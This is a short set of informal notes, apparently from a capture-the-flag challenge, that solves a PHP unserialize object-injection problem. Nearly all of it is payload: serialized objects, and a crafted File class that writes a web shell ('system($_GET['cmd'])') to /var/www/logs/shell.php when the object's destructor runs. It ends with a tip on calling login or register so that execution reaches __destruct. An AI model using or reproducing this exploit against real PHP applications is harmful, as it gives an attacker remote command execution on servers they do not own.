need thing to unserialize

O:8:"Example2":1:{s:14:"Example2hook";s:10:"phpinfo();";}

from owasp ^^

O:8:"File":1:{s:14:"Example2hook";s:10:"phpinfo();";}


public $uuid = "Hello!! <?php system('ls');system($_GET['cmd']);?>";


class File {
	public $logfile = "/var/www/shell.php";
	public $uuid = "Hello!! <?php system('ls');system($_GET['cmd']);?>";
}



the solution:
class File {
	public $owner,$uuid='Hello!! <?php system("ls");system($_GET["cmd"]);?>';
  	public $logfile = "/var/www/logs/shell.php";

} 

needed to call login or register so that it didn't try to actually use the user variable and could successfully get to the end and call __destruct
